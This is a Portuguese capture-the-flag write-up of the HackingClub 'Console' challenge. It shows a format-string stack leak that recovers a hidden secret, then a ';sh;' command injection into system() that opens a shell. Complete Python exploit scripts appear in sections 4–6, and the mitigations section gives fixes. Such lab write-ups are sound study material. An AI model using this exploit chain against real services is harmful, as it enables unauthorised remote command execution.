---
title: "Console CTF Challenge"
platform: hackingclub
date: 2026-06-25
difficulty: easy
category: "Binary Exploitation / Format String + Command Injection"
description: "Binário decoy com segredo falso: vazamento da pilha via format string para recuperar o segredo real e, em seguida, command injection dentro de um buffer de 9 bytes para ler a flag."
tags: [pwn, format-string, info-leak, command-injection, socat, pie, ctf]
flag: "hackingclub{REDACTED}"
target: "10.10.0.26:1337"
---

## Índice

1. [Visão Geral](#visão-geral)
2. [Reconhecimento Inicial](#1-reconhecimento-inicial)
3. [Análise do Código-Fonte](#2-análise-do-código-fonte)
4. [A Armadilha: Binário e Flag Decoy](#3-a-armadilha-binário-e-flag-decoy)
5. [Vulnerabilidade 1 — Format String (leak do segredo)](#4-vulnerabilidade-1--format-string-leak-do-segredo)
6. [Vulnerabilidade 2 — Command Injection em 9 bytes](#5-vulnerabilidade-2--command-injection-em-9-bytes)
7. [Captura da Flag](#6-captura-da-flag)
8. [Por que a Vulnerabilidade Existe](#7-por-que-a-vulnerabilidade-existe)
9. [Linha do Tempo do Ataque](#8-linha-do-tempo-do-ataque)
10. [Referências e Materiais de Estudo](#9-referências-e-materiais-de-estudo)

---

## Visão Geral

O desafio **Console** entrega um binário ELF de 64 bits (`main`) acompanhado do
seu código-fonte (`main.c`), de um script auxiliar (`debug_console.sh`) e do
`Dockerfile` que descreve o serviço. O programa roda atrás de um `socat` na
porta `1337`, como o usuário `nobody`:

```sh
# entrypoint.sh
su -s /bin/bash nobody -c "socat TCP-LISTEN:1337,fork EXEC:'/app/program'"
```

O fluxo do programa é simples na superfície: ele pede um *secret*, e só se você
acertar o segredo ganha acesso a um "console de debug" que executa comandos
pré-definidos (`process`, `whoami`, `id`). Mas há **duas vulnerabilidades
encadeadas** — e um detalhe sujo: o binário fornecido é um *decoy*.

A exploração percorre os seguintes passos:

```
Secret errado → printf(input) [format string] → vaza secret real da pilha
   → Secret certo → debugConsole() → sprintf("...'%s'", input) [cmd injection]
   → ';sh;'  → shell como nobody → cat /flag-*.txt
```

O ponto-chave: **o segredo embutido no binário que recebemos (`FAKE_SECRET`) não
é o segredo que roda no servidor**. Precisamos vazar o segredo real em runtime
via format string antes de chegar à injeção de comando.

---

## 1. Reconhecimento Inicial

### Arquivos do desafio

```
attachments/
├── Dockerfile
├── debug_console.sh
├── entrypoint.sh
├── flag.txt          # hackingclub{f4k3_fl4g}  ← decoy
├── main              # ELF 64-bit, not stripped
└── main.c            # código-fonte
```

### O binário

```bash
file main
# main: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
#       interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

Proteções (relevante notar que **nenhuma delas atrapalha** este desafio, porque
o bug é lógico, não de corrupção de memória):

| Mitigação      | Status        | Evidência                                  |
|----------------|---------------|--------------------------------------------|
| PIE            | ✅ Habilitado | `pie executable`, `FLAGS_1: PIE`           |
| Full RELRO     | ✅ Habilitado | `BIND_NOW` + `GNU_RELRO`                    |
| NX             | ✅ Habilitado | `GNU_STACK ... RW` (sem flag de execução)   |
| Stack Canary   | ✅ Presente   | símbolo `__stack_chk_fail`                  |

Mesmo com tudo ligado, vamos ler a flag sem escrever um único byte fora dos
limites — as falhas estão no **uso indevido de `printf` e `system`**.

### O Dockerfile

```dockerfile
FROM ubuntu:latest
RUN apt update -y && apt install socat -y
COPY ./flag.txt /flag.txt
RUN mv /flag.txt /flag-`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1`.txt
WORKDIR /app
COPY ./debug_console.sh ./debug_console.sh
COPY ./main ./program
RUN chmod +x ./program ./debug_console.sh
ENTRYPOINT [ "/entrypoint.sh" ]
```

Dois detalhes importantes:

1. A flag é renomeada para `/flag-<32 chars aleatórios>.txt`. Não dá para
   adivinhar o nome — precisamos de um glob (`/flag-*.txt`) ou de um `ls /` em
   tempo de execução. Isso já sugere que o objetivo final é **execução de
   comandos**, não apenas leitura de um caminho fixo.
2. O `flag.txt` versionado contém `hackingclub{f4k3_fl4g}` — um placeholder. A
   flag real só existe no container em produção.

---

## 2. Análise do Código-Fonte

O `main.c` completo (anotado):

```c
void debugConsole()
{
    size_t inputSize = 10;
    char* input = (char*)malloc(inputSize * sizeof(char));   // 10 bytes

    printf("Choose: process,whoami,id\n> ");

    if(fgets(input, inputSize, stdin) == NULL) { ... }       // lê no MÁX 9 chars
    input[strlen(input) - 1] = '\0';                         // remove '\n'

    size_t commandSize = 255;
    char* command = (char*)malloc(commandSize * sizeof(command));

    sprintf(command, "./debug_console.sh '%s'", input);      // ← (2) CMD INJECTION
    system(command);
}

int main()
{
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char secret[] = "FAKE_SECRET";                           // ← (3) DECOY

    printf("Secret: ");
    char* secretInputBuffer = (char*)malloc(255);
    if(fgets(secretInputBuffer, 255, stdin) == NULL) { ... }
    secretInputBuffer[strlen(secretInputBuffer) - 1] = '\0';

    if(strcmp(secretInputBuffer, secret)) {                  // != 0  → segredo errado
        char* outputBuffer = (char*)malloc(255);
        sprintf(outputBuffer, "Invalid Secret: %s\n", secretInputBuffer);
        printf(outputBuffer);                                // ← (1) FORMAT STRING
        return 1;
    }

    debugConsole();                                          // só com segredo certo
    return 0;
}
```

Identificamos imediatamente três pontos de interesse:

- **(1) `printf(outputBuffer)`** — `outputBuffer` contém entrada do usuário e é
  passado **como string de formato**. Format string clássico, no caminho do
  *segredo errado*.
- **(2) `sprintf(command, "./debug_console.sh '%s'", input)`** seguido de
  `system(command)` — injeção de comando, no caminho do *segredo certo*.
- **(3) `char secret[] = "FAKE_SECRET"`** — o segredo é uma variável **local na
  pilha** de `main`, e o valor no fonte é claramente um placeholder.

O `debug_console.sh` é só um dispatcher inofensivo:

```bash
if [[ "$1" == "process" ]]; then ps aux
elif [[ "$1" == "whoami" ]]; then whoami
elif [[ "$1" == "id" ]]; then id
else echo "Usage: $0 <process,whoami,id>"; fi
```

Inofensivo — *desde que* `$1` seja realmente um único argumento. É exatamente
isso que a injeção quebra.

---

## 3. A Armadilha: Binário e Flag Decoy

A primeira tentativa "óbvia" é mandar o segredo do fonte e tentar a injeção:

```bash
printf "FAKE_SECRET\n';sh;'\nid; cat /flag-*.txt\n" | nc 10.10.0.26 1337
```

Resposta:

```
Secret: Invalid Secret: FAKE_SECRET
```

`strcmp` retornou **diferente de zero** → o segredo `FAKE_SECRET` está **errado
no servidor**. Ou seja: o binário (e a flag) dos anexos são *decoys*. O servidor
roda uma versão com um segredo real diferente, e nós não o temos.

Para confirmar que o segredo realmente é uma string embutida e onde ele vive,
desmontamos `main`:

```nasm
; main() — construção da variável `secret` na pilha
movabs rax, 0x4345535f454b4146      ; "FAKE_SEC"  (little-endian)
mov    QWORD PTR [rbp-0x14], rax     ; secret[0..7]
mov    DWORD PTR [rbp-0xc], 0x544552 ; "RET\0"     → "FAKE_SECRET"
...
call   strcmp@plt
test   eax, eax
je     main+0x151                    ; se IGUAL (==0) → chama debugConsole()
```

No nosso binário `secret` vale `FAKE_SECRET` e fica em `[rbp-0x14]`. No binário
do servidor o **código é o mesmo**, apenas com outra string literal — e ela é
escrita na pilha **antes** do `strcmp` e do `printf`. Isso é tudo que
precisamos: a variável estará viva na pilha no momento em que o format string
dispara. 🎯

---

## 4. Vulnerabilidade 1 — Format String (leak do segredo)

### A primitiva

Quando erramos o segredo, o programa executa:

```c
sprintf(outputBuffer, "Invalid Secret: %s\n", secretInputBuffer);
printf(outputBuffer);   // sem "%s" → nossa entrada É o formato
```

Se a nossa entrada contém especificadores como `%p`, o `printf` vai
interpretá-los e **ler argumentos que não existem** — ou seja, vai ler valores
diretamente dos registradores e da pilha. Como `secret` é uma local de `main`,
ela está na pilha, ao alcance dos `%N$p`.

> `outputBuffer` tem 255 bytes e nossa entrada (`secretInputBuffer`) também é um
> heap buffer de 255 — temos espaço de sobra para uma string de formato longa,
> diferente do buffer apertado da injeção mais adiante.

### Dumpando a pilha

Mandamos uma string de formato que imprime os 40 primeiros argumentos
posicionais como ponteiros:

```python
import socket, time

def leak(payload):
    s = socket.socket(); s.settimeout(8); s.connect(("10.10.0.26", 1337))
    s.recv(4096)                       # "Secret: "
    s.sendall(payload + b"\n")
    time.sleep(1)
    d = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            d += c
    except Exception:
        pass
    s.close()
    return d

fmt = b"|".join(b"%%%d$p" % i for i in range(1, 41))   # %1$p|%2$p|...|%40$p
print(leak(fmt))
```

Saída (recortada nas posições interessantes):

```
Invalid Secret: 0x55c2...|(nil)|(nil)|0x73|(nil)|0xff|0x55c2...|0xff|0x55c2...
|0x4b5f743372633353|0x33643135625f7933|0x5f4a525f35|0xf3f34bd0f33b5200|...
        ^%10$p              ^%11$p           ^%12$p        ^%13$p (já é lixo)
```

### Reconstruindo o segredo

Três posições consecutivas carregam bytes ASCII. Como o x86-64 é
little-endian, cada qword decodifica invertendo a ordem dos bytes:

| Posição | Valor (hex)          | Bytes (LE)              | ASCII      |
|---------|----------------------|-------------------------|------------|
| `%10$p` | `0x4b5f743372633353` | `53 33 63 72 33 74 5f 4b` | `S3cr3t_K` |
| `%11$p` | `0x33643135625f7933` | `33 79 5f 62 35 31 64 33` | `3y_b51d3` |
| `%12$p` | `0x5f4a525f35`       | `35 5f 52 4a 5f 00 ..`    | `5_RJ_\0`  |

A posição `%13$p` (`0x...5200`) já tem um byte nulo no início, confirmando o fim
da string. Concatenando:

```
S3cr3t_K + 3y_b51d3 + 5_RJ_  →  S3cr3t_K3y_b51d35_RJ_
```

**Segredo real: `S3cr3t_K3y_b51d35_RJ_`**

Snippet para automatizar a decodificação:

```python
import struct
leaked = [0x4b5f743372633353, 0x33643135625f7933, 0x5f4a525f35]
secret = b"".join(struct.pack("<Q", q) for q in leaked).split(b"\x00")[0]
print(secret.decode())   # S3cr3t_K3y_b51d35_RJ_
```

---

## 5. Vulnerabilidade 2 — Command Injection em 9 bytes

Com o segredo certo, `strcmp` retorna `0`, o salto `je` é tomado e caímos em
`debugConsole()`. Lá mora a segunda falha:

```c
sprintf(command, "./debug_console.sh '%s'", input);
system(command);
```

A entrada é colocada **entre aspas simples**. Isso *parece* seguro, mas aspas
simples no shell só protegem enquanto não forem fechadas. Se a nossa entrada
fechar a aspa, podemos emendar comandos arbitrários.

### A restrição: só 9 bytes

O detalhe que torna o desafio interessante é o tamanho do buffer:

```c
size_t inputSize = 10;
char* input = (char*)malloc(inputSize);
fgets(input, inputSize, stdin);   // lê no MÁXIMO inputSize-1 = 9 chars
```

`fgets` lê no máximo **9 caracteres** (mais o `\0`). E como o `\n` final conta e
depois é removido, sobram pouquíssimos bytes úteis para o payload. Precisamos de
uma injeção *curtíssima*.

### O payload mínimo

```
input = ';sh;'        (6 caracteres — cabe folgado nos 9)
```

Substituindo no template `./debug_console.sh '<input>'`:

```sh
./debug_console.sh '';sh;''
                   └┬┘│  │└┬┘
              arg vazio │  │ arg vazio
                        │  └ separador de comando
                        └ separador → executa `sh`
```

O shell vê três comandos: `./debug_console.sh ''` (roda o dispatcher com
argumento vazio → cai no "Usage"), depois **`sh`** (um shell interativo!), e
por fim `''` (comando vazio). Como o `socat` liga o nosso socket ao
`stdin`/`stdout` do processo, o `sh` resultante lê os próximos comandos
**direto da nossa conexão**.

Outras variações que também caberiam: `';id;'`, ou injetar o comando inteiro se
ele couber em 9 bytes (`'`+5 chars). Abrir um `sh` é a escolha mais flexível.

---

## 6. Captura da Flag

Encadeando tudo num único exploit:

```python
#!/usr/bin/env python3
import socket, time, struct

HOST, PORT = "10.10.0.26", 1337

# --- Passo 1: format string para vazar o segredo real ---
s = socket.socket(); s.settimeout(8); s.connect((HOST, PORT))
s.recv(4096)                                       # "Secret: "
s.sendall(b"%10$p|%11$p|%12$p\n")                  # leak das 3 qwords do secret
time.sleep(1)
leak = s.recv(4096).decode(); s.close()

qwords = [int(x, 16) for x in leak.split(":")[1].strip().split("|")]
secret = b"".join(struct.pack("<Q", q) for q in qwords).split(b"\x00")[0]
print("[+] secret:", secret.decode())              # S3cr3t_K3y_b51d35_RJ_

# --- Passo 2: segredo correto + command injection ---
s = socket.socket(); s.settimeout(12); s.connect((HOST, PORT))
time.sleep(0.3); s.sendall(secret + b"\n")         # passa o strcmp → debugConsole()
time.sleep(0.3); s.sendall(b"';sh;'\n")            # injeção → shell como nobody
time.sleep(0.3); s.sendall(b"cat /flag-*.txt\n")   # nome aleatório → glob
time.sleep(2)
print(s.recv(8192).decode(errors="replace"))
```

Execução:

```
[+] secret: S3cr3t_K3y_b51d35_RJ_
Secret: Choose: process,whoami,id
> Usage: ./debug_console.sh <process,whoami,id>
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
hackingclub{REDACTED}
```

**FLAG: `hackingclub{REDACTED}`**

O próprio nome da flag — *stack leakage and cmd injection* — confirma a cadeia
de exploração pretendida pelo autor.

> **Bônus:** o mesmo shell permite explorar o container inteiro como `nobody`
> (`ls -la /`, `cat /etc/passwd`, etc.). A flag estava em
> `/flag-JlmvRzaiW0SlEZ5zLGlR4bO5gokq57aM.txt`, exatamente o padrão aleatório
> gerado no `Dockerfile`.

---

## 7. Por que a Vulnerabilidade Existe

### Falha 1 — `printf` com formato controlado pelo usuário

```c
printf(outputBuffer);   // ERRADO
```

Sempre que o primeiro argumento de `printf`/`fprintf`/`sprintf`/`syslog` contém
dados do usuário, o atacante controla a string de formato. Com `%p`/`%x` lê-se
a pilha (leak de segredos, ponteiros para derrotar ASLR/PIE, canários); com
`%n` é possível até **escrever** em memória. Aqui bastou o leak para recuperar
um segredo que o desenvolvedor presumiu ser secreto só por estar "embutido" no
binário.

A correção é trivial:

```c
printf("%s", outputBuffer);   // CERTO — formato fixo, dado como argumento
```

### Falha 2 — `system()` com string montada por concatenação

```c
sprintf(command, "./debug_console.sh '%s'", input);
system(command);
```

Envolver a entrada em aspas simples **não** é sanitização: o atacante fecha a
aspa (`'`) e injeta `;`, `|`, `&&`, `$(...)`, etc. A regra de ouro é nunca
construir uma linha de comando do shell a partir de input. Em vez disso:

```c
// Sem shell no meio: argumentos passados como vetor, sem reinterpretação.
char *argv[] = { "./debug_console.sh", input, NULL };
execve(argv[0], argv, environ);   // (após fork)
```

…e, idealmente, validar `input` contra uma *allow-list* (`process`, `whoami`,
`id`) antes de qualquer coisa.

### A cadeia de confiança quebrada

```
[secret errado]  printf(input)            ──► leak do `secret` na pilha
                                                       │
[secret certo]   sprintf+system(input)   ◄─────────────┘  ──► RCE como nobody
```

A "autenticação" por segredo embutido é teatro de segurança: o segredo vive na
pilha em texto claro e foi extraído pelo primeiro bug. Depois, o segundo bug
transforma um console de comandos restrito num shell completo. Duas práticas
inseguras de C, isoladamente clássicas, combinam-se numa cadeia limpa de leak →
bypass → RCE.

### Detalhe de design: a restrição de 9 bytes

O autor reduziu deliberadamente o buffer de input (`malloc(10)` / `fgets(...,10)`)
para forçar um payload de injeção *mínimo*. É um lembrete de que injeção de
comando não precisa de payloads longos — `';sh;'` (6 bytes) já basta para
escalar de "comando restrito" para "shell arbitrário".

---

## 8. Linha do Tempo do Ataque

```
1.  [RECON]    Anexos: main.c + main (PIE, não-stripped) + Dockerfile
2.  [RECON]    Dockerfile → flag em /flag-<random>.txt → objetivo é RCE, não path fixo
3.  [SOURCE]   main.c → printf(outputBuffer) [fmt string] + sprintf/system [cmd inj]
4.  [PROBE]    Envia "FAKE_SECRET" → "Invalid Secret" → binário/flag são DECOY
5.  [DISASM]   secret é local de main, escrito na pilha antes do strcmp/printf
6.  [LEAK]     "%10$p|%11$p|%12$p" → vaza S3cr3t_K3y_b51d35_RJ_ da pilha
7.  [AUTH]     Reconecta, envia o segredo real → strcmp==0 → debugConsole()
8.  [EXPLOIT]  input ';sh;' (6 bytes, cabe em 9) → ./debug_console.sh '';sh;''
9.  [RCE]      shell interativo como nobody no socat
10. [FLAG]     cat /flag-*.txt → hackingclub{REDACTED}
```

---

## 9. Referências e Materiais de Estudo

### Format String

- [OWASP — Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
  Visão geral da classe de vulnerabilidade e dos especificadores perigosos.
- [CWE-134 — Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html)
  Definição formal e exemplos de código vulnerável vs. seguro.
- [Exploiting Format String Vulnerabilities (scut/team teso)](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
  Paper clássico que explica o leak via `%x`/`%p` e a escrita via `%n`.
- [CTF 101 — Format String](https://ctf101.org/binary-exploitation/format-string-vulnerability/)
  Tutorial prático de leak de pilha com argumentos posicionais `%N$p`.

### Command Injection

- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
  Como entradas chegam ao shell e por que aspas não sanitizam.
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
  A falha por trás do `sprintf` + `system`.
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
  Laboratórios práticos de injeção e técnicas de quebra de delimitadores.
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
  Coletânea de payloads e técnicas de bypass.

### C Seguro / APIs corretas

- [SEI CERT C — FIO30-C: Exclude user input from format strings](https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.+Exclude+user+input+from+format+strings)
  Regra que o `printf(outputBuffer)` viola.
- [SEI CERT C — ENV33-C: Do not call system()](https://wiki.sei.cmu.edu/confluence/display/c/ENV33-C.+Do+not+call+system%28%29)
  Por que `execve`/`posix_spawn` são preferíveis a `system`.
- [man 3 exec / execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)
  Execução sem passar pelo interpretador de shell.

### Ferramentas Utilizadas

- [pwntools](https://docs.pwntools.com/) — automação de exploits de pwn (alternativa ao socket cru)
- [GDB + pwndbg](https://github.com/pwndbg/pwndbg) — inspeção de pilha e offsets de format string
- [objdump / readelf (binutils)](https://www.gnu.org/software/binutils/) — disassembly e proteções do ELF
- [checksec](https://github.com/slimm609/checksec.sh) — verificação rápida de mitigações

---

## Mitigações

1. **Nunca use entrada do usuário como string de formato.** Troque
   `printf(buf)` por `printf("%s", buf)`. Compile com `-Wformat -Wformat-security`
   (e trate como erro com `-Werror=format-security`) para pegar isso ainda no build.
2. **Não construa comandos de shell por concatenação.** Use `execve`/`posix_spawn`
   com `argv` separado; aspas simples não sanitizam. Quando o conjunto de ações é
   fixo (`process`/`whoami`/`id`), valide contra uma *allow-list* e despache para
   funções nativas em vez de chamar um script.
3. **Não confie em "segredos" embutidos no binário.** Strings literais ficam em
   texto claro no binário e na pilha — recuperáveis por leak ou simples `strings`.
   Autenticação real exige segredo do lado do servidor, comparação em tempo
   constante e, idealmente, hashing.
4. **Não devolva mensagens diagnósticas com dados sensíveis ao cliente.** O eco do
   input ("Invalid Secret: %s") foi o que abriu o canal de format string.
5. **Princípio do menor privilégio.** O serviço já roda como `nobody` (bom), mas a
   flag estava legível por ele. Restrinja o que o processo enxerga (sem a flag no
   FS acessível, sem segredos no ambiente).

```c
/* Versão corrigida do núcleo do programa */
#include <unistd.h>
extern char **environ;

void debugConsole(const char *choice) {
    /* allow-list: nada de shell, nada de concatenação */
    if (strcmp(choice, "process") && strcmp(choice, "whoami") && strcmp(choice, "id")) {
        puts("Usage: <process,whoami,id>");
        return;
    }
    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = { "./debug_console.sh", (char *)choice, NULL };
        execve(argv[0], argv, environ);   // sem shell intermediário
        _exit(127);
    }
    int st; waitpid(pid, &st, 0);
}

/* ... e no main: */
printf("%s", outputBuffer);   // formato fixo
```

---

*WriteUp produzido durante resolução do CTF HackingClub — Room: Console*
*Data: 2026-06-25*
